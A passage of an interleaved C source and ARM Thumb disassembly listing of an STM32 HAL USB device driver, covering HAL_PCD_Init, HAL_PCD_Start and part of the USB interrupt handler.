 8001bf8:	af06      	add	r7, sp, #24
 8001bfa:	6078      	str	r0, [r7, #4]
  USB_OTG_GlobalTypeDef *USBx;
#endif /* defined (USB_OTG_FS) */
  uint8_t i;

  /* Check the PCD handle allocation */
  if (hpcd == NULL)
 8001bfc:	687b      	ldr	r3, [r7, #4]
 8001bfe:	2b00      	cmp	r3, #0
 8001c00:	d101      	bne.n	8001c06 <HAL_PCD_Init+0x12>
  {
    return HAL_ERROR;
 8001c02:	2301      	movs	r3, #1
 8001c04:	e0f8      	b.n	8001df8 <HAL_PCD_Init+0x204>

#if defined (USB_OTG_FS)
  USBx = hpcd->Instance;
#endif /* defined (USB_OTG_FS) */

  if (hpcd->State == HAL_PCD_STATE_RESET)
 8001c06:	687b      	ldr	r3, [r7, #4]
 8001c08:	f893 32a9 	ldrb.w	r3, [r3, #681]	; 0x2a9
 8001c0c:	b2db      	uxtb	r3, r3
 8001c0e:	2b00      	cmp	r3, #0
 8001c10:	d106      	bne.n	8001c20 <HAL_PCD_Init+0x2c>
  {
    /* Allocate lock resource and initialize it */
    hpcd->Lock = HAL_UNLOCKED;
 8001c12:	687b      	ldr	r3, [r7, #4]
 8001c14:	2200      	movs	r2, #0
 8001c16:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

    /* Init the low level hardware */
    hpcd->MspInitCallback(hpcd);
#else
    /* Init the low level hardware : GPIO, CLOCK, NVIC... */
    HAL_PCD_MspInit(hpcd);
 8001c1a:	6878      	ldr	r0, [r7, #4]
 8001c1c:	f00a fde4 	bl	800c7e8 <HAL_PCD_MspInit>
#endif /* (USE_HAL_PCD_REGISTER_CALLBACKS) */
  }

  hpcd->State = HAL_PCD_STATE_BUSY;
 8001c20:	687b      	ldr	r3, [r7, #4]
 8001c22:	2203      	movs	r2, #3
 8001c24:	f883 22a9 	strb.w	r2, [r3, #681]	; 0x2a9
    hpcd->Init.dma_enable = 0U;
  }
#endif /* defined (USB_OTG_FS) */

  /* Disable the Interrupts */
  __HAL_PCD_DISABLE(hpcd);
 8001c28:	687b      	ldr	r3, [r7, #4]
 8001c2a:	681b      	ldr	r3, [r3, #0]
 8001c2c:	4618      	mov	r0, r3
 8001c2e:	f004 f8d4 	bl	8005dda <USB_DisableGlobalInt>

  /*Init the Core (common init.) */
  if (USB_CoreInit(hpcd->Instance, hpcd->Init) != HAL_OK)
 8001c32:	687b      	ldr	r3, [r7, #4]
 8001c34:	681b      	ldr	r3, [r3, #0]
 8001c36:	603b      	str	r3, [r7, #0]
 8001c38:	687e      	ldr	r6, [r7, #4]
 8001c3a:	466d      	mov	r5, sp
 8001c3c:	f106 0410 	add.w	r4, r6, #16
 8001c40:	cc0f      	ldmia	r4!, {r0, r1, r2, r3}
 8001c42:	c50f      	stmia	r5!, {r0, r1, r2, r3}
 8001c44:	6823      	ldr	r3, [r4, #0]
 8001c46:	602b      	str	r3, [r5, #0]
 8001c48:	1d33      	adds	r3, r6, #4
 8001c4a:	cb0e      	ldmia	r3, {r1, r2, r3}
 8001c4c:	6838      	ldr	r0, [r7, #0]
 8001c4e:	f004 f89c 	bl	8005d8a <USB_CoreInit>
 8001c52:	4603      	mov	r3, r0
 8001c54:	2b00      	cmp	r3, #0
 8001c56:	d005      	beq.n	8001c64 <HAL_PCD_Init+0x70>
  {
    hpcd->State = HAL_PCD_STATE_ERROR;
 8001c58:	687b      	ldr	r3, [r7, #4]
 8001c5a:	2202      	movs	r2, #2
 8001c5c:	f883 22a9 	strb.w	r2, [r3, #681]	; 0x2a9
    return HAL_ERROR;
 8001c60:	2301      	movs	r3, #1
 8001c62:	e0c9      	b.n	8001df8 <HAL_PCD_Init+0x204>
  }

  /* Force Device Mode*/
  (void)USB_SetCurrentMode(hpcd->Instance, USB_DEVICE_MODE);
 8001c64:	687b      	ldr	r3, [r7, #4]
 8001c66:	681b      	ldr	r3, [r3, #0]
 8001c68:	2100      	movs	r1, #0
 8001c6a:	4618      	mov	r0, r3
 8001c6c:	f004 f8d0 	bl	8005e10 <USB_SetCurrentMode>

  /* Init endpoints structures */
  for (i = 0U; i < hpcd->Init.dev_endpoints; i++)
 8001c70:	2300      	movs	r3, #0
 8001c72:	73fb      	strb	r3, [r7, #15]
 8001c74:	e040      	b.n	8001cf8 <HAL_PCD_Init+0x104>
  {
    /* Init ep structure */
    hpcd->IN_ep[i].is_in = 1U;
 8001c76:	7bfb      	ldrb	r3, [r7, #15]
 8001c78:	6879      	ldr	r1, [r7, #4]
 8001c7a:	1c5a      	adds	r2, r3, #1
 8001c7c:	4613      	mov	r3, r2
 8001c7e:	009b      	lsls	r3, r3, #2
 8001c80:	4413      	add	r3, r2
 8001c82:	00db      	lsls	r3, r3, #3
 8001c84:	440b      	add	r3, r1
 8001c86:	3301      	adds	r3, #1
 8001c88:	2201      	movs	r2, #1
 8001c8a:	701a      	strb	r2, [r3, #0]
    hpcd->IN_ep[i].num = i;
 8001c8c:	7bfb      	ldrb	r3, [r7, #15]
 8001c8e:	6879      	ldr	r1, [r7, #4]
 8001c90:	1c5a      	adds	r2, r3, #1
 8001c92:	4613      	mov	r3, r2
 8001c94:	009b      	lsls	r3, r3, #2
 8001c96:	4413      	add	r3, r2
 8001c98:	00db      	lsls	r3, r3, #3
 8001c9a:	440b      	add	r3, r1
 8001c9c:	7bfa      	ldrb	r2, [r7, #15]
 8001c9e:	701a      	strb	r2, [r3, #0]
#if defined (USB_OTG_FS)
    hpcd->IN_ep[i].tx_fifo_num = i;
#endif /* defined (USB_OTG_FS) */
    /* Control until ep is activated */
    hpcd->IN_ep[i].type = EP_TYPE_CTRL;
 8001ca0:	7bfb      	ldrb	r3, [r7, #15]
 8001ca2:	6879      	ldr	r1, [r7, #4]
 8001ca4:	1c5a      	adds	r2, r3, #1
 8001ca6:	4613      	mov	r3, r2
 8001ca8:	009b      	lsls	r3, r3, #2
 8001caa:	4413      	add	r3, r2
 8001cac:	00db      	lsls	r3, r3, #3
 8001cae:	440b      	add	r3, r1
 8001cb0:	3303      	adds	r3, #3
 8001cb2:	2200      	movs	r2, #0
 8001cb4:	701a      	strb	r2, [r3, #0]
    hpcd->IN_ep[i].maxpacket = 0U;
 8001cb6:	7bfa      	ldrb	r2, [r7, #15]
 8001cb8:	6879      	ldr	r1, [r7, #4]
 8001cba:	4613      	mov	r3, r2
 8001cbc:	009b      	lsls	r3, r3, #2
 8001cbe:	4413      	add	r3, r2
 8001cc0:	00db      	lsls	r3, r3, #3
 8001cc2:	440b      	add	r3, r1
 8001cc4:	3338      	adds	r3, #56	; 0x38
 8001cc6:	2200      	movs	r2, #0
 8001cc8:	601a      	str	r2, [r3, #0]
    hpcd->IN_ep[i].xfer_buff = 0U;
 8001cca:	7bfa      	ldrb	r2, [r7, #15]
 8001ccc:	6879      	ldr	r1, [r7, #4]
 8001cce:	4613      	mov	r3, r2
 8001cd0:	009b      	lsls	r3, r3, #2
 8001cd2:	4413      	add	r3, r2
 8001cd4:	00db      	lsls	r3, r3, #3
 8001cd6:	440b      	add	r3, r1
 8001cd8:	333c      	adds	r3, #60	; 0x3c
 8001cda:	2200      	movs	r2, #0
 8001cdc:	601a      	str	r2, [r3, #0]
    hpcd->IN_ep[i].xfer_len = 0U;
 8001cde:	7bfa      	ldrb	r2, [r7, #15]
 8001ce0:	6879      	ldr	r1, [r7, #4]
 8001ce2:	4613      	mov	r3, r2
 8001ce4:	009b      	lsls	r3, r3, #2
 8001ce6:	4413      	add	r3, r2
 8001ce8:	00db      	lsls	r3, r3, #3
 8001cea:	440b      	add	r3, r1
 8001cec:	3340      	adds	r3, #64	; 0x40
 8001cee:	2200      	movs	r2, #0
 8001cf0:	601a      	str	r2, [r3, #0]
  for (i = 0U; i < hpcd->Init.dev_endpoints; i++)
 8001cf2:	7bfb      	ldrb	r3, [r7, #15]
 8001cf4:	3301      	adds	r3, #1
 8001cf6:	73fb      	strb	r3, [r7, #15]
 8001cf8:	7bfa      	ldrb	r2, [r7, #15]
 8001cfa:	687b      	ldr	r3, [r7, #4]
 8001cfc:	685b      	ldr	r3, [r3, #4]
 8001cfe:	429a      	cmp	r2, r3
 8001d00:	d3b9      	bcc.n	8001c76 <HAL_PCD_Init+0x82>
  }

  for (i = 0U; i < hpcd->Init.dev_endpoints; i++)
 8001d02:	2300      	movs	r3, #0
 8001d04:	73fb      	strb	r3, [r7, #15]
 8001d06:	e044      	b.n	8001d92 <HAL_PCD_Init+0x19e>
  {
    hpcd->OUT_ep[i].is_in = 0U;
 8001d08:	7bfa      	ldrb	r2, [r7, #15]
 8001d0a:	6879      	ldr	r1, [r7, #4]
 8001d0c:	4613      	mov	r3, r2
 8001d0e:	009b      	lsls	r3, r3, #2
 8001d10:	4413      	add	r3, r2
 8001d12:	00db      	lsls	r3, r3, #3
 8001d14:	440b      	add	r3, r1
 8001d16:	f203 1369 	addw	r3, r3, #361	; 0x169
 8001d1a:	2200      	movs	r2, #0
 8001d1c:	701a      	strb	r2, [r3, #0]
    hpcd->OUT_ep[i].num = i;
 8001d1e:	7bfa      	ldrb	r2, [r7, #15]
 8001d20:	6879      	ldr	r1, [r7, #4]
 8001d22:	4613      	mov	r3, r2
 8001d24:	009b      	lsls	r3, r3, #2
 8001d26:	4413      	add	r3, r2
 8001d28:	00db      	lsls	r3, r3, #3
 8001d2a:	440b      	add	r3, r1
 8001d2c:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8001d30:	7bfa      	ldrb	r2, [r7, #15]
 8001d32:	701a      	strb	r2, [r3, #0]
    /* Control until ep is activated */
    hpcd->OUT_ep[i].type = EP_TYPE_CTRL;
 8001d34:	7bfa      	ldrb	r2, [r7, #15]
 8001d36:	6879      	ldr	r1, [r7, #4]
 8001d38:	4613      	mov	r3, r2
 8001d3a:	009b      	lsls	r3, r3, #2
 8001d3c:	4413      	add	r3, r2
 8001d3e:	00db      	lsls	r3, r3, #3
 8001d40:	440b      	add	r3, r1
 8001d42:	f203 136b 	addw	r3, r3, #363	; 0x16b
 8001d46:	2200      	movs	r2, #0
 8001d48:	701a      	strb	r2, [r3, #0]
    hpcd->OUT_ep[i].maxpacket = 0U;
 8001d4a:	7bfa      	ldrb	r2, [r7, #15]
 8001d4c:	6879      	ldr	r1, [r7, #4]
 8001d4e:	4613      	mov	r3, r2
 8001d50:	009b      	lsls	r3, r3, #2
 8001d52:	4413      	add	r3, r2
 8001d54:	00db      	lsls	r3, r3, #3
 8001d56:	440b      	add	r3, r1
 8001d58:	f503 73bc 	add.w	r3, r3, #376	; 0x178
 8001d5c:	2200      	movs	r2, #0
 8001d5e:	601a      	str	r2, [r3, #0]
    hpcd->OUT_ep[i].xfer_buff = 0U;
 8001d60:	7bfa      	ldrb	r2, [r7, #15]
 8001d62:	6879      	ldr	r1, [r7, #4]
 8001d64:	4613      	mov	r3, r2
 8001d66:	009b      	lsls	r3, r3, #2
 8001d68:	4413      	add	r3, r2
 8001d6a:	00db      	lsls	r3, r3, #3
 8001d6c:	440b      	add	r3, r1
 8001d6e:	f503 73be 	add.w	r3, r3, #380	; 0x17c
 8001d72:	2200      	movs	r2, #0
 8001d74:	601a      	str	r2, [r3, #0]
    hpcd->OUT_ep[i].xfer_len = 0U;
 8001d76:	7bfa      	ldrb	r2, [r7, #15]
 8001d78:	6879      	ldr	r1, [r7, #4]
 8001d7a:	4613      	mov	r3, r2
 8001d7c:	009b      	lsls	r3, r3, #2
 8001d7e:	4413      	add	r3, r2
 8001d80:	00db      	lsls	r3, r3, #3
 8001d82:	440b      	add	r3, r1
 8001d84:	f503 73c0 	add.w	r3, r3, #384	; 0x180
 8001d88:	2200      	movs	r2, #0
 8001d8a:	601a      	str	r2, [r3, #0]
  for (i = 0U; i < hpcd->Init.dev_endpoints; i++)
 8001d8c:	7bfb      	ldrb	r3, [r7, #15]
 8001d8e:	3301      	adds	r3, #1
 8001d90:	73fb      	strb	r3, [r7, #15]
 8001d92:	7bfa      	ldrb	r2, [r7, #15]
 8001d94:	687b      	ldr	r3, [r7, #4]
 8001d96:	685b      	ldr	r3, [r3, #4]
 8001d98:	429a      	cmp	r2, r3
 8001d9a:	d3b5      	bcc.n	8001d08 <HAL_PCD_Init+0x114>
  }

  /* Init Device */
  if (USB_DevInit(hpcd->Instance, hpcd->Init) != HAL_OK)
 8001d9c:	687b      	ldr	r3, [r7, #4]
 8001d9e:	681b      	ldr	r3, [r3, #0]
 8001da0:	603b      	str	r3, [r7, #0]
 8001da2:	687e      	ldr	r6, [r7, #4]
 8001da4:	466d      	mov	r5, sp
 8001da6:	f106 0410 	add.w	r4, r6, #16
 8001daa:	cc0f      	ldmia	r4!, {r0, r1, r2, r3}
 8001dac:	c50f      	stmia	r5!, {r0, r1, r2, r3}
 8001dae:	6823      	ldr	r3, [r4, #0]
 8001db0:	602b      	str	r3, [r5, #0]
 8001db2:	1d33      	adds	r3, r6, #4
 8001db4:	cb0e      	ldmia	r3, {r1, r2, r3}
 8001db6:	6838      	ldr	r0, [r7, #0]
 8001db8:	f004 f837 	bl	8005e2a <USB_DevInit>
 8001dbc:	4603      	mov	r3, r0
 8001dbe:	2b00      	cmp	r3, #0
 8001dc0:	d005      	beq.n	8001dce <HAL_PCD_Init+0x1da>
  {
    hpcd->State = HAL_PCD_STATE_ERROR;
 8001dc2:	687b      	ldr	r3, [r7, #4]
 8001dc4:	2202      	movs	r2, #2
 8001dc6:	f883 22a9 	strb.w	r2, [r3, #681]	; 0x2a9
    return HAL_ERROR;
 8001dca:	2301      	movs	r3, #1
 8001dcc:	e014      	b.n	8001df8 <HAL_PCD_Init+0x204>
  }

  hpcd->USB_Address = 0U;
 8001dce:	687b      	ldr	r3, [r7, #4]
 8001dd0:	2200      	movs	r2, #0
 8001dd2:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
  hpcd->State = HAL_PCD_STATE_READY;
 8001dd6:	687b      	ldr	r3, [r7, #4]
 8001dd8:	2201      	movs	r2, #1
 8001dda:	f883 22a9 	strb.w	r2, [r3, #681]	; 0x2a9

  /* Activate LPM */
  if (hpcd->Init.lpm_enable == 1U)
 8001dde:	687b      	ldr	r3, [r7, #4]
 8001de0:	69db      	ldr	r3, [r3, #28]
 8001de2:	2b01      	cmp	r3, #1
 8001de4:	d102      	bne.n	8001dec <HAL_PCD_Init+0x1f8>
  {
    (void)HAL_PCDEx_ActivateLPM(hpcd);
 8001de6:	6878      	ldr	r0, [r7, #4]
 8001de8:	f001 fc9e 	bl	8003728 <HAL_PCDEx_ActivateLPM>
  }

  (void)USB_DevDisconnect(hpcd->Instance);
 8001dec:	687b      	ldr	r3, [r7, #4]
 8001dee:	681b      	ldr	r3, [r3, #0]
 8001df0:	4618      	mov	r0, r3
 8001df2:	f006 fadf 	bl	80083b4 <USB_DevDisconnect>

  return HAL_OK;
 8001df6:	2300      	movs	r3, #0
}
 8001df8:	4618      	mov	r0, r3
 8001dfa:	3714      	adds	r7, #20
 8001dfc:	46bd      	mov	sp, r7
 8001dfe:	bdf0      	pop	{r4, r5, r6, r7, pc}

08001e00 <HAL_PCD_Start>:
  * @brief  Start the USB device
  * @param  hpcd PCD handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_Start(PCD_HandleTypeDef *hpcd)
{
 8001e00:	b580      	push	{r7, lr}
 8001e02:	b082      	sub	sp, #8
 8001e04:	af00      	add	r7, sp, #0
 8001e06:	6078      	str	r0, [r7, #4]
#if defined (USB_OTG_FS)
  USB_OTG_GlobalTypeDef *USBx = hpcd->Instance;
#endif /* defined (USB_OTG_FS) */

  __HAL_LOCK(hpcd);
 8001e08:	687b      	ldr	r3, [r7, #4]
 8001e0a:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 8001e0e:	2b01      	cmp	r3, #1
 8001e10:	d101      	bne.n	8001e16 <HAL_PCD_Start+0x16>
 8001e12:	2302      	movs	r3, #2
 8001e14:	e012      	b.n	8001e3c <HAL_PCD_Start+0x3c>
 8001e16:	687b      	ldr	r3, [r7, #4]
 8001e18:	2201      	movs	r2, #1
 8001e1a:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  {
    /* Enable USB Transceiver */
    USBx->GCCFG |= USB_OTG_GCCFG_PWRDWN;
  }
#endif /* defined (USB_OTG_FS) */
  __HAL_PCD_ENABLE(hpcd);
 8001e1e:	687b      	ldr	r3, [r7, #4]
 8001e20:	681b      	ldr	r3, [r3, #0]
 8001e22:	4618      	mov	r0, r3
 8001e24:	f003 ffc2 	bl	8005dac <USB_EnableGlobalInt>
  (void)USB_DevConnect(hpcd->Instance);
 8001e28:	687b      	ldr	r3, [r7, #4]
 8001e2a:	681b      	ldr	r3, [r3, #0]
 8001e2c:	4618      	mov	r0, r3
 8001e2e:	f006 faaa 	bl	8008386 <USB_DevConnect>
  __HAL_UNLOCK(hpcd);
 8001e32:	687b      	ldr	r3, [r7, #4]
 8001e34:	2200      	movs	r2, #0
 8001e36:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 8001e3a:	2300      	movs	r3, #0
}
 8001e3c:	4618      	mov	r0, r3
 8001e3e:	3708      	adds	r7, #8
 8001e40:	46bd      	mov	sp, r7
 8001e42:	bd80      	pop	{r7, pc}

08001e44 <HAL_PCD_IRQHandler>:
  * @brief  This function handles PCD interrupt request.
  * @param  hpcd PCD handle
  * @retval HAL status
  */
void HAL_PCD_IRQHandler(PCD_HandleTypeDef *hpcd)
{
 8001e44:	b580      	push	{r7, lr}
 8001e46:	b084      	sub	sp, #16
 8001e48:	af00      	add	r7, sp, #0
 8001e4a:	6078      	str	r0, [r7, #4]
  uint32_t wIstr = USB_ReadInterrupts(hpcd->Instance);
 8001e4c:	687b      	ldr	r3, [r7, #4]
 8001e4e:	681b      	ldr	r3, [r3, #0]
 8001e50:	4618      	mov	r0, r3
 8001e52:	f006 fac4 	bl	80083de <USB_ReadInterrupts>
 8001e56:	60f8      	str	r0, [r7, #12]

  if ((wIstr & USB_ISTR_CTR) == USB_ISTR_CTR)
 8001e58:	68fb      	ldr	r3, [r7, #12]
 8001e5a:	f403 4300 	and.w	r3, r3, #32768	; 0x8000
 8001e5e:	2b00      	cmp	r3, #0
 8001e60:	d003      	beq.n	8001e6a <HAL_PCD_IRQHandler+0x26>
  {
    /* servicing of the endpoint correct transfer interrupt */
    /* clear of the CTR flag into the sub */
    (void)PCD_EP_ISR_Handler(hpcd);
 8001e62:	6878      	ldr	r0, [r7, #4]
 8001e64:	f000 fb59 	bl	800251a <PCD_EP_ISR_Handler>

    return;
 8001e68:	e110      	b.n	800208c <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_RESET) == USB_ISTR_RESET)
 8001e6a:	68fb      	ldr	r3, [r7, #12]
 8001e6c:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8001e70:	2b00      	cmp	r3, #0
 8001e72:	d013      	beq.n	8001e9c <HAL_PCD_IRQHandler+0x58>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_RESET);
 8001e74:	687b      	ldr	r3, [r7, #4]
 8001e76:	681b      	ldr	r3, [r3, #0]
 8001e78:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8001e7c:	b29a      	uxth	r2, r3
 8001e7e:	687b      	ldr	r3, [r7, #4]
 8001e80:	681b      	ldr	r3, [r3, #0]
 8001e82:	f422 6280 	bic.w	r2, r2, #1024	; 0x400
 8001e86:	b292      	uxth	r2, r2
 8001e88:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
    hpcd->ResetCallback(hpcd);
#else
    HAL_PCD_ResetCallback(hpcd);
 8001e8c:	6878      	ldr	r0, [r7, #4]
 8001e8e:	f00a fd4c 	bl	800c92a <HAL_PCD_ResetCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

    (void)HAL_PCD_SetAddress(hpcd, 0U);
 8001e92:	2100      	movs	r1, #0
 8001e94:	6878      	ldr	r0, [r7, #4]
 8001e96:	f000 f8fc 	bl	8002092 <HAL_PCD_SetAddress>

    return;
 8001e9a:	e0f7      	b.n	800208c <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_PMAOVR) == USB_ISTR_PMAOVR)
 8001e9c:	68fb      	ldr	r3, [r7, #12]
 8001e9e:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8001ea2:	2b00      	cmp	r3, #0
 8001ea4:	d00c      	beq.n	8001ec0 <HAL_PCD_IRQHandler+0x7c>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_PMAOVR);
 8001ea6:	687b      	ldr	r3, [r7, #4]
 8001ea8:	681b      	ldr	r3, [r3, #0]
 8001eaa:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8001eae:	b29a      	uxth	r2, r3
 8001eb0:	687b      	ldr	r3, [r7, #4]
 8001eb2:	681b      	ldr	r3, [r3, #0]
 8001eb4:	f422 4280 	bic.w	r2, r2, #16384	; 0x4000
 8001eb8:	b292      	uxth	r2, r2
 8001eba:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    return;
 8001ebe:	e0e5      	b.n	800208c <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_ERR) == USB_ISTR_ERR)
 8001ec0:	68fb      	ldr	r3, [r7, #12]
 8001ec2:	f403 5300 	and.w	r3, r3, #8192	; 0x2000
 8001ec6:	2b00      	cmp	r3, #0
 8001ec8:	d00c      	beq.n	8001ee4 <HAL_PCD_IRQHandler+0xa0>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_ERR);
 8001eca:	687b      	ldr	r3, [r7, #4]
 8001ecc:	681b      	ldr	r3, [r3, #0]
 8001ece:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8001ed2:	b29a      	uxth	r2, r3
 8001ed4:	687b      	ldr	r3, [r7, #4]
 8001ed6:	681b      	ldr	r3, [r3, #0]
 8001ed8:	f422 5200 	bic.w	r2, r2, #8192	; 0x2000
 8001edc:	b292      	uxth	r2, r2
 8001ede:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    return;
 8001ee2:	e0d3      	b.n	800208c <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_WKUP) == USB_ISTR_WKUP)
 8001ee4:	68fb      	ldr	r3, [r7, #12]
 8001ee6:	f403 5380 	and.w	r3, r3, #4096	; 0x1000
 8001eea:	2b00      	cmp	r3, #0
 8001eec:	d034      	beq.n	8001f58 <HAL_PCD_IRQHandler+0x114>
  {
    hpcd->Instance->CNTR &= (uint16_t) ~(USB_CNTR_LPMODE);
 8001eee:	687b      	ldr	r3, [r7, #4]
 8001ef0:	681b      	ldr	r3, [r3, #0]
 8001ef2:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8001ef6:	b29a      	uxth	r2, r3
 8001ef8:	687b      	ldr	r3, [r7, #4]
 8001efa:	681b      	ldr	r3, [r3, #0]
 8001efc:	f022 0204 	bic.w	r2, r2, #4
 8001f00:	b292      	uxth	r2, r2
 8001f02:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40
    hpcd->Instance->CNTR &= (uint16_t) ~(USB_CNTR_FSUSP);
 8001f06:	687b      	ldr	r3, [r7, #4]
 8001f08:	681b      	ldr	r3, [r3, #0]
 8001f0a:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8001f0e:	b29a      	uxth	r2, r3
 8001f10:	687b      	ldr	r3, [r7, #4]
 8001f12:	681b      	ldr	r3, [r3, #0]
 8001f14:	f022 0208 	bic.w	r2, r2, #8
 8001f18:	b292      	uxth	r2, r2
 8001f1a:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

    if (hpcd->LPM_State == LPM_L1)
 8001f1e:	687b      	ldr	r3, [r7, #4]
 8001f20:	f893 32e0 	ldrb.w	r3, [r3, #736]	; 0x2e0
 8001f24:	2b01      	cmp	r3, #1
 8001f26:	d107      	bne.n	8001f38 <HAL_PCD_IRQHandler+0xf4>
    {
      hpcd->LPM_State = LPM_L0;
 8001f28:	687b      	ldr	r3, [r7, #4]
 8001f2a:	2200      	movs	r2, #0
 8001f2c:	f883 22e0 	strb.w	r2, [r3, #736]	; 0x2e0
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
      hpcd->LPMCallback(hpcd, PCD_LPM_L0_ACTIVE);
#else
      HAL_PCDEx_LPM_Callback(hpcd, PCD_LPM_L0_ACTIVE);
 8001f30:	2100      	movs	r1, #0
 8001f32:	6878      	ldr	r0, [r7, #4]
 8001f34:	f00a ffd6 	bl	800cee4 <HAL_PCDEx_LPM_Callback>
    }

#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
    hpcd->ResumeCallback(hpcd);
#else
    HAL_PCD_ResumeCallback(hpcd);
 8001f38:	6878      	ldr	r0, [r7, #4]
 8001f3a:	f00a fd2f 	bl	800c99c <HAL_PCD_ResumeCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_WKUP);
 8001f3e:	687b      	ldr	r3, [r7, #4]
 8001f40:	681b      	ldr	r3, [r3, #0]
 8001f42:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8001f46:	b29a      	uxth	r2, r3
 8001f48:	687b      	ldr	r3, [r7, #4]
 8001f4a:	681b      	ldr	r3, [r3, #0]
 8001f4c:	f422 5280 	bic.w	r2, r2, #4096	; 0x1000
 8001f50:	b292      	uxth	r2, r2
 8001f52:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    return;
 8001f56:	e099      	b.n	800208c <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_SUSP) == USB_ISTR_SUSP)
 8001f58:	68fb      	ldr	r3, [r7, #12]
 8001f5a:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 8001f5e:	2b00      	cmp	r3, #0
 8001f60:	d027      	beq.n	8001fb2 <HAL_PCD_IRQHandler+0x16e>
  {
    /* Force low-power mode in the macrocell */
    hpcd->Instance->CNTR |= (uint16_t)USB_CNTR_FSUSP;
 8001f62:	687b      	ldr	r3, [r7, #4]
 8001f64:	681b      	ldr	r3, [r3, #0]
 8001f66:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8001f6a:	b29a      	uxth	r2, r3
 8001f6c:	687b      	ldr	r3, [r7, #4]
 8001f6e:	681b      	ldr	r3, [r3, #0]
 8001f70:	f042 0208 	orr.w	r2, r2, #8
 8001f74:	b292      	uxth	r2, r2
 8001f76:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

    /* clear of the ISTR bit must be done after setting of CNTR_FSUSP */
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_SUSP);
 8001f7a:	687b      	ldr	r3, [r7, #4]
 8001f7c:	681b      	ldr	r3, [r3, #0]
 8001f7e:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8001f82:	b29a      	uxth	r2, r3
 8001f84:	687b      	ldr	r3, [r7, #4]
 8001f86:	681b      	ldr	r3, [r3, #0]
 8001f88:	f422 6200 	bic.w	r2, r2, #2048	; 0x800
 8001f8c:	b292      	uxth	r2, r2
 8001f8e:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    hpcd->Instance->CNTR |= (uint16_t)USB_CNTR_LPMODE;
 8001f92:	687b      	ldr	r3, [r7, #4]
 8001f94:	681b      	ldr	r3, [r3, #0]
 8001f96:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8001f9a:	b29a      	uxth	r2, r3
 8001f9c:	687b      	ldr	r3, [r7, #4]
 8001f9e:	681b      	ldr	r3, [r3, #0]
 8001fa0:	f042 0204 	orr.w	r2, r2, #4
 8001fa4:	b292      	uxth	r2, r2
 8001fa6:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
    hpcd->SuspendCallback(hpcd);
#else
    HAL_PCD_SuspendCallback(hpcd);
 8001faa:	6878      	ldr	r0, [r7, #4]
 8001fac:	f00a fcdc 	bl	800c968 <HAL_PCD_SuspendCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

    return;
 8001fb0:	e06c      	b.n	800208c <HAL_PCD_IRQHandler+0x248>
  }

  /* Handle LPM Interrupt */
  if ((wIstr & USB_ISTR_L1REQ) == USB_ISTR_L1REQ)
 8001fb2:	68fb      	ldr	r3, [r7, #12]
 8001fb4:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8001fb8:	2b00      	cmp	r3, #0
 8001fba:	d040      	beq.n	800203e <HAL_PCD_IRQHandler+0x1fa>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_L1REQ);
 8001fbc:	687b      	ldr	r3, [r7, #4]
 8001fbe:	681b      	ldr	r3, [r3, #0]
 8001fc0:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8001fc4:	b29a      	uxth	r2, r3
 8001fc6:	687b      	ldr	r3, [r7, #4]
 8001fc8:	681b      	ldr	r3, [r3, #0]
 8001fca:	f022 0280 	bic.w	r2, r2, #128	; 0x80
 8001fce:	b292      	uxth	r2, r2
 8001fd0:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44
    if (hpcd->LPM_State == LPM_L0)
 8001fd4:	687b      	ldr	r3, [r7, #4]
 8001fd6:	f893 32e0 	ldrb.w	r3, [r3, #736]	; 0x2e0
 8001fda:	2b00      	cmp	r3, #0
